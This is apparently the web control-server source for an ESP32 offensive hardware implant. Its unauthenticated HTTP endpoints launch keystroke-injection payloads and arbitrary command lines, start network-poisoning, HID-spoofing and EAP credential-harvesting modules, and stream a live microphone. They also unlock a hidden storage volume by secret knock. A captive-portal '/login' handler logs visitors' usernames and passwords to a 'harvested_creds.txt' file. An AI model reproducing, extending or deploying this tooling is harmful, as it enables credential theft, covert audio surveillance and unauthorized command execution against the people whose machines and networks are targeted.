#ifndef NO_WEB
#include "WebServer.h"

#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include "AsyncJson.h"
#include <ArduinoJson.h>
#include <uptime.h>
#include <ElegantOTA.h>

#include "../../Devices/TFT/HardwareTFT.h"
#include "../../Devices/Storage/HardwareStorage.h"
#include "../../Devices/WiFi/HardwareWiFi.h"
#include "../../Devices/Microphone/HardwareMicrophone.h"
#include "../../Devices/USB/USBCore.h"
#include "../../Devices/USB/USBCDC.h"
#include "../../Attacks/Agent/Agent.h"
#include "../../Debug/Logging.h"

#include "../../Attacks/Marauder/Marauder.h"
#include "../../Attacks/Ducky/DuckyPayload.h"
#include "../../Attacks/Ghost/SilentSentinel.h"
#include "../../Attacks/Neo/EtherHarvest.h"
#include "../../Attacks/Neo/EtherHarvest.h"
#include "../../Attacks/Trinity/HydraHID.h"
#include "../../Attacks/Trinity/EapHarvester.h"
#include "../../Attacks/Shadow/ShadowVolume.h"

#ifdef ENABLE_BLUE_TEAM_TELEMETRY
#include "../../Attacks/Blue/Telemetry.h"
#endif

#include "../../Utilities/Settings.h"
#include "../../version.h"

#define LOG_WEB "WEB"

namespace Comms
{
  WebSite Web;
}

static AsyncWebServer controlInterfaceWebServer(8080);
static AsyncWebSocket ws("/websockify");
static AsyncWebSocket audio("/audio");

extern std::unordered_map<const char *, std::pair<const uint8_t *, size_t>> staticHtmlFilesLookup;
static const char *remoteAddress = "127.0.0.1:7002";
static Preferences *preferences = nullptr;

static const std::unordered_map<std::string, std::string> mimeTypes = {
    {".html", "text/html"},
    {".js", "application/javascript"},
    {".png", "image/png"},
    {".jpg", "image/jpeg"},
    {".ico", "image/x-icon"},
    {".css", "text/css"},
    {".svg", "image/svg+xml"}};

static std::string prettyPrintUptime()
{
  std::string ret;
  if (uptime::getDays() != 0)
  {
    ret += std::to_string(uptime::getDays()) + " days";
  }
  if (uptime::getHours() != 0)
  {
    ret += std::to_string(uptime::getHours()) + " hours";
  }
  if (uptime::getMinutes() != 0)
  {
    ret += std::to_string(uptime::getMinutes()) + " minutes";
  }
  if (ret.empty())
  {
    ret = "A few seconds";
  }

  return ret;
}

static void onWsEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len)
{
  if (type == WS_EVT_CONNECT)
  {
    uint32_t remoteAddLen = strlen(remoteAddress);
    Devices::USB::CDC.writeBinary(HostCommand::WSCONNECT, (uint8_t *)remoteAddress, remoteAddLen);
  }
  else if (type == WS_EVT_DATA && data != nullptr && len != 0)
  {
    Devices::USB::CDC.writeBinary(HostCommand::WSDATA, data, len);
  }
  else if (type == WS_EVT_DISCONNECT)
  {
    Devices::USB::CDC.writeBinary(HostCommand::WSDISCONNECT, nullptr, 0);
  }
  else
  {
    Devices::USB::CDC.writeDebugString("Got an unhandler websocket event: " + std::to_string(type));
  }
}

static void onWsAudioEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len)
{
  if (type == WS_EVT_DISCONNECT)
  {
    Devices::Mic.stopCapture();
  }
}


std::pair<const uint8_t *, size_t> getStaticHtml(const String& url)
{
  if (url == "/theme.css")
  {        
      return std::make_pair<const uint8_t *, size_t>(nullptr, 0); 
  }
  if (url == "/js/ducky_visualizer.js" || url == "/js/log_widget.js") {
      // Fallback to file system serving for these new JS modules
      return std::make_pair<const uint8_t *, size_t>(nullptr, 0);
  }

  for (const auto &[key, value] : staticHtmlFilesLookup)
  {
    if (url == key)
    {
      return value;
    }
  }
  return std::make_pair<const uint8_t *, size_t>(nullptr, 0);
}

static const char *GetMimeType(const char *fname)
{
  std::string filename(fname);
  // Extract the file extension
  size_t dotPos = filename.find_last_of('.');
  if (dotPos == std::string::npos)
  {
    // No extension found
    return nullptr;
  }

  std::string extension = filename.substr(dotPos);

  // Look up the MIME type
  auto it = mimeTypes.find(extension);
  if (it != mimeTypes.end())
  {
    return it->second.c_str();
  }
  else
  {
    // Extension not found in our mapping
    return nullptr;
  }
}

static void webRequestHandler(AsyncWebServerRequest *request)
{
  const auto &url = request->url();
  // Debug::Log.info(LOG_WEB, std::string("webRequestHandler ") + url.c_str());

  if (url == "/wpad.dat")
  {
    request->send(404);
  }
  else if (url == "/connecttest.txt")
  {
    request->send(404);
  }
  else if (url == "/data.json")
  {
    AsyncJsonResponse *response = new AsyncJsonResponse();
    JsonObject root = response->getRoot();

    root["sdCardPercentFull"] = Devices::Storage.usedPercentage();
    root["uptime"] = prettyPrintUptime();
    root["status"] = Attacks::Ducky.getPayloadRunningStatus();
    root["errorCount"] = Attacks::Ducky.getTotalErrors();
    root["USBmode"] = Devices::USB::Core.getCurrentUSBMode();
    root["freeHeap"] = ESP.getFreeHeap();
    root["heapSize"] = ESP.getHeapSize();
    root["agentConnected"] = Attacks::Agent.isAgentConnected();
    root["machineName"] = Attacks::Agent.machineName();
    root["version"] = GIT_COMMIT_HASH;

    float heapUsed = (float)(ESP.getHeapSize() - ESP.getFreeHeap());
    float totalHeap = (float)ESP.getHeapSize();

    root["heapUsagePc"] = (int)((heapUsed / totalHeap) * 100);
    root["numCores"] = ESP.getChipCores();
    root["chipModel"] = ESP.getChipModel();

    auto fileListing = root["fileListing"].to<JsonArray>();
    for (const auto &filename : Devices::Storage.listFiles())
    {
      fileListing.add(filename);
    }

    auto logMessages = root["logMessages"].to<JsonArray>();
    for (const auto &logEntry : Debug::Log.getLogs())
    {
      logMessages.add(logEntry);
    }

    if (preferences != nullptr)
    {
      auto settingsCategories = root["settingCategories"].to<JsonArray>();
      enumerateSettingsAsJson(*preferences, settingsCategories);
    }

    auto capabilities = root["capabilities"].to<JsonArray>();
#ifndef NO_SD
    capabilities.add("SD");
#endif
#ifndef NO_WIFI
    capabilities.add("WIFI");
#endif
#ifndef NO_TFT
    capabilities.add("TFT");
#endif
#ifndef NO_BUTTON
    capabilities.add("BUTTON");
#endif
#ifndef NO_LED
    capabilities.add("LED");
#endif
#ifndef NO_MIC
    capabilities.add("MIC");
#endif
#ifndef NO_ESP_MARAUDER
    capabilities.add("MARAUDER");
#endif
    root["ghostRunning"] = Attacks::Ghost.isRunning();
    root["ghostRunning"] = Attacks::Ghost.isRunning();
    root["ghostCaptured"] = Attacks::Ghost.getCapturedCount();
    root["neoRunning"] = Attacks::Neo.isRunning();
    root["neoPoisoned"] = Attacks::Neo.getPoisonedCount();
    root["hydraRunning"] = Attacks::Trinity.isRunning();
    root["hydraIdentity"] = Attacks::Trinity.getCurrentIdentity().manufacturer + " " + Attacks::Trinity.getCurrentIdentity().product;
    root["eapRunning"] = Attacks::Eap.isRunning();
    root["eapCaptured"] = Attacks::Eap.getCapturedCount();
    root["shadowActive"] = Attacks::GhostStorage.isShadowActive();

    response->setLength();
    response->addHeader("X-Content-Type-Options", "nosniff");
    response->addHeader("X-Frame-Options", "DENY");
    response->addHeader("X-XSS-Protection", "1; mode=block");
    request->send(response);
  }
  else if (url == "/clearlogs")
  {
    Debug::Log.clear();
    request->redirect("/index.html"); // redirect to our main page
  }
  else if (url == "/generate_204" || url == "/ncsi.txt" || url == "/hotspot-detect.html" || url == "/wpad.dat")
  {
    request->redirect("/"); // redirect to our main page for captive portal
  }
  else if (url == "/runfile" && request->hasParam("filename"))
  {
    const String filename = request->getParam("filename")->value();
    Debug::Log.info(LOG_WEB, std::string("Executing file from webUI - ") + filename.c_str());

    Attacks::Ducky.setPayload(filename.c_str());
    request->redirect("/index.html"); // redirect to our main page
  }
  else if (url == "/rawinput" && request->hasParam("rawCommand"))
  {
    const String cmdline = request->getParam("rawCommand")->value();
    Debug::Log.info(LOG_WEB, std::string("Running cmdline ") + cmdline.c_str());

    Attacks::Ducky.setPayloadCmdLine(cmdline.c_str());
    request->redirect("/index.html"); // redirect to our main page
  }
  else if (url == "/runagentcmd" && request->hasParam("rawCommand"))
  {
    const String cmdline = request->getParam("rawCommand")->value();
    Debug::Log.info(LOG_WEB, std::string("Running cmd with agent ") + cmdline.c_str());

    Attacks::Ducky.setPayloadCmdLine(std::string("AGENT_RUN ") + cmdline.c_str());
    request->redirect("/index.html"); // redirect to our main page
  }
  else if (url == "/showimage" && request->hasParam("filename"))
  {
    const String filename = request->getParam("filename")->value();
    Debug::Log.info(LOG_WEB, "Show image");
    Debug::Log.info(LOG_WEB, filename.c_str());

    Devices::TFT.displayPng(Devices::Storage, filename.c_str());

    request->redirect("/index.html"); // redirect to our main page
  }
  else if (url == "/marauder" && request->hasParam("marauderCmd"))
  {
    const String cmd = request->getParam("marauderCmd")->value();
    Debug::Log.info(LOG_WEB, std::string("Run Marauder command ") + std::string(cmd.c_str()));
    Attacks::Marauder.run(cmd.c_str());

    request->redirect("/index.html"); // redirect to our main page
  }
  else if (url == "/mic" && request->hasParam("enabled"))
  {
    const String cmd = request->getParam("enabled")->value();
    if (cmd == "true")
    {
      Debug::Log.info(LOG_WEB, "Starting Mic capture");
      Devices::Mic.startCapture();
    }
    else
    {
      Debug::Log.info(LOG_WEB, "Stopping Mic capture");
      Devices::Mic.stopCapture();
    }
    request->send(200);
  }

  else if (url == "/neo/start")
  {
    Debug::Log.info(LOG_WEB, "Starting Ether-Harvest");
    Attacks::Neo.start();
    request->send(200, "text/plain", "Ether-Harvest Started");
  }
  else if (url == "/neo/stop")
  {
    Debug::Log.info(LOG_WEB, "Stopping Ether-Harvest");
    Attacks::Neo.stop();
    request->send(200, "text/plain", "Ether-Harvest Stopped");
  }
  else if (url == "/trinity/start")
  {
    Debug::Log.info(LOG_WEB, "Starting Hydra-HID");
    Attacks::Trinity.start();
    request->send(200, "text/plain", "Hydra-HID Started");
  }
  else if (url == "/trinity/stop")
  {
     Debug::Log.info(LOG_WEB, "Stopping Hydra-HID");
     Attacks::Trinity.stop();
     request->send(200, "text/plain", "Hydra-HID Stopped");
  }
  else if (url == "/trinity/eap/start")
  {
     Debug::Log.info(LOG_WEB, "Starting EAP Harvester");
     Attacks::Eap.start();
     request->send(200, "text/plain", "EAP Harvester Started");
  }
  else if (url == "/trinity/eap/stop")
  {
     Debug::Log.info(LOG_WEB, "Stopping EAP Harvester");
     Attacks::Eap.stop();
     request->send(200, "text/plain", "EAP Harvester Stopped");
  }
  else if (url == "/ghost/start")
  {
    Debug::Log.info(LOG_WEB, "Starting Silent Sentinel");
    Attacks::Ghost.start();
    request->send(200, "text/plain", "Silent Sentinel Started");
  }
  else if (url == "/ghost/stop")
  {
    Debug::Log.info(LOG_WEB, "Stopping Silent Sentinel");
    Attacks::Ghost.stop();
    request->send(200, "text/plain", "Silent Sentinel Stopped");
  }
  else if (url == "/shadow/knock" && request->hasParam("key"))
  {
     // Shadow Volume Secret Knock
     const String key = request->getParam("key")->value();
     Debug::Log.info(LOG_WEB, "Received Shadow Knock");
     Attacks::GhostStorage.registerKnock(std::string(key.c_str()));
     request->redirect("/index.html");
  }
  else if (url == "/shadow/lock")
  {
     Debug::Log.info(LOG_WEB, "Locking Shadow Volume");
     Attacks::GhostStorage.disableShadow();
     request->redirect("/index.html");
  }
  else if (url == "/download" && request->hasParam("filename"))
  {
    const String filename = request->getParam("filename")->value();
    Debug::Log.info(LOG_WEB, std::string("In download, filename: ")+filename.c_str());
    auto file = Devices::Storage.openFile(filename.c_str(), "r");

    if (file.available())
    {
      Debug::Log.info(LOG_WEB, std::string("Sending file: ") + filename.c_str());
      AsyncWebServerResponse *response = request->beginResponse(file, filename, "application/octet-stream", true);
      request->send(response);
      // The File object uses RAII (reference counting). Passing it to beginResponse
      // creates a copy in the response object. When the response is finished and destroyed,
      // the File copy is destroyed, decrementing the ref count. When it hits 0, the file closes.
      // Explicitly closing it here would invalidate the handle used by the response.
    }
    else
    {
      Debug::Log.info(LOG_WEB, std::string("File not found: ") + filename.c_str());
      request->send(404);
    }
  }
  else if (url == "/delete" && request->hasParam("filename"))
  {
    const String filename = request->getParam("filename")->value();

    Debug::Log.info(LOG_WEB, std::string("Deleting file: ") + std::string(filename.c_str()));

    Devices::Storage.deleteFile(filename.c_str());

    request->redirect("/index.html"); // redirect to our main page
  }
  else if (url.startsWith("/set") && preferences != nullptr && request->hasParam("name"))
  {
    const String settingName = request->getParam("name")->value();

    if (request->hasParam("value"))
    {
      const String settingValue = request->getParam("value")->value();

      Debug::Log.info(LOG_WEB, std::string("Set setting") + settingName.c_str() + " to " + settingValue.c_str());

      if (setSettingValue(*preferences, settingName.c_str(), settingValue.c_str()))
      {
        Debug::Log.info(LOG_WEB, "New setting has been set");
      }
      else
      {
        Debug::Log.info(LOG_WEB, "Setting could not be set");
      }
    }
    else
    {
      Debug::Log.info(LOG_WEB, "Removing setting");
      preferences->remove(settingName.c_str());
    }
    request->redirect("/index.html"); // redirect to our main page
  }
  else if (url.startsWith("/uploadFile"))
  {
    // ignore, handled else where
    request->send(404);
  }
  else
  {
    std::pair<const uint8_t *, size_t> data;
    const char *unknown = "application/octet-stream";

    if (url.isEmpty() || url.length() == 1)
    {
      data = getStaticHtml("/index.html");
    }
    else
    {
      data = getStaticHtml(url);
    }

    if (data.first != nullptr)
    {
      const char *mime = GetMimeType(url.isEmpty() || url.length() == 1 ? "/index.html" : url.c_str());

      AsyncWebServerResponse *response = request->beginResponse(200, mime != nullptr ? mime : unknown, data.first, data.second);
      response->addHeader("Content-Encoding", "gzip");
      response->addHeader("Cache-Control", "max-age=6000");
      response->addHeader("X-Content-Type-Options", "nosniff");
      response->addHeader("X-Frame-Options", "DENY");
      response->addHeader("X-XSS-Protection", "1; mode=block");
      request->send(response);
    }
    // FALLBACK: Try to serve from SD Card if not in static lookup (e.g. theme.css)
    else if (Devices::Storage.doesFileExist(url.c_str())) 
    {
       const char *mime = GetMimeType(url.c_str());
       request->send(Devices::Storage.openFile(url.c_str(), "r"), url, mime != nullptr ? mime : unknown);
    }
    else
    {
      // Serial.println("sending 404");
      Debug::Log.error(LOG_WEB, std::string("Unknown URL: ") + url.c_str());
      request->send(404);
    }
  }
}

void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final)
{
  const auto &url = request->url();

  if (url.startsWith("/uploadFile"))
  {
    if (!index) {
    
      // We need to ensure that if the autorun.ds payload is currently running then we stop it
      // Otherwise we risk changing the file content while the script is executing
      if (filename == "autorun.ds")
      {
        Attacks::Ducky.setPayload("");
      }

      request->_tempFile = Devices::Storage.openFile(std::string("/")+filename.c_str(), "w");
      if (strlen(request->_tempFile.name()) == 0)
      {
        Debug::Log.error(LOG_WEB, std::string("File not available, no write permission"));
        request->send(500);
        return;
      }
    }

    if (len != 0)
    {
      if (request->_tempFile.write(data, len) != len)
      {
        Debug::Log.error(LOG_WEB, std::string("Error writing data to file"));
        request->send(500);
        return;
      }
      else
      {
        Debug::Log.info(LOG_WEB, std::string("Wrote data to file"));
      }
    }
    else if (!final) // len == 0
    {
      Debug::Log.error(LOG_WEB, std::string("File data to write is 0 bytes"));
      request->send(500);
      return;
    }

    if (final)
    {
      // close file
      Debug::Log.info(LOG_WEB, std::string("File uploaded ")+filename.c_str());
      request->_tempFile.close();
      Devices::Storage.refreshCache();
    }
    request->send(200);
  }
}

WebSite::WebSite()
{
}

static bool serverHandlersAdded = false;

void WebSite::begin(Preferences &prefs)
{
  if (Devices::WiFi.getState() == false)
  {
    return;
  }

  preferences = &prefs;

  if (!serverHandlersAdded)
  {
    controlInterfaceWebServer.onFileUpload(handleUpload);
    controlInterfaceWebServer.onNotFound(webRequestHandler);
    
    ws.onEvent(onWsEvent);
    audio.onEvent(onWsAudioEvent);

    controlInterfaceWebServer.addHandler(&ws);
    controlInterfaceWebServer.addHandler(&audio);

    // Captive Portal Login Harvester
    controlInterfaceWebServer.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
      if (request->hasParam("username", true) && request->hasParam("password", true)) {
        String user = request->getParam("username", true)->value();
        String pass = request->getParam("password", true)->value();
        std::string logMsg = "Harvested Creds: " + std::string(user.c_str()) + " / " + std::string(pass.c_str());
        Debug::Log.info(LOG_WEB, logMsg);
        
        // Log to telemetry if enabled
#ifdef ENABLE_BLUE_TEAM_TELEMETRY
        Attacks::Blue::Logger.logCommand("captive_portal_login", logMsg);
#endif

        // Save to SD
        if (Devices::Storage.isRunning()) {
          auto file = Devices::Storage.openFile("/harvested_creds.txt", "a");
          if (file) {
            file.println(logMsg.c_str());
            file.close();
          }
        }
      }
      request->send(200, "text/html", "<html><body><h1>Success. Connecting...</h1></body></html>");
    });

    // Dynamic Web Payload Generator
    controlInterfaceWebServer.on("/api/payload/generate", HTTP_POST, [](AsyncWebServerRequest *request) {
      if (request->hasParam("payload", true)) {
        String payload = request->getParam("payload", true)->value();
        
        if (Devices::Storage.isRunning()) {
          auto file = Devices::Storage.openFile("/dynamic_payload.ds", "w");
          if (file) {
            file.print(payload);
            file.close();
            Attacks::Ducky.setPayload("/dynamic_payload.ds");
            request->send(200, "text/plain", "Payload generated and executing.");
            return;
          }
        }
        // Fallback to raw cmdline if SD fails
        Attacks::Ducky.setPayloadCmdLine(payload.c_str());
        request->send(200, "text/plain", "Payload sent to memory.");
      } else {
        request->send(400, "text/plain", "Missing payload parameter.");
      }
    });

    ElegantOTA.begin(&controlInterfaceWebServer); // Start ElegantOTA
    serverHandlersAdded = true;
  }
  
  controlInterfaceWebServer.begin();

  Devices::USB::CDC.setCallback(HostCommand::WSDATARECV, [](uint8_t *buffer, const size_t size) -> void
  { 
    ws.binaryAll(buffer, size);
  });

  Devices::Mic.setCallback([](uint8_t *buffer, const size_t size) -> bool
  {
    if (ESP.getFreeHeap() < (size * 2)) // double what we need
    {
      Debug::Log.info(LOG_WEB, "Could not write data to /audio, not enough free mem");
      return true;
    }

    audio.binaryAll(buffer, size);
    return true;
  });

  // ElegantOTA started in one-time init above
}

void WebSite::loop(Preferences &prefs)
{
  if (preferences == nullptr)
  {
    return;
  }

  ws.cleanupClients();
  audio.cleanupClients();
  ElegantOTA.loop();
}

void WebSite::end()
{
  if (preferences == nullptr)
  {
    return;
  }

  // Stop the server from listening
  controlInterfaceWebServer.end();
  
  // Note: We do not remove handlers because ESPAsyncWebServer doesn't support 
  // easy removal and we want to avoid crashes. Since we guard adding them 
  // with serverHandlersAdded, it's safe to leave them attached.
}

#endif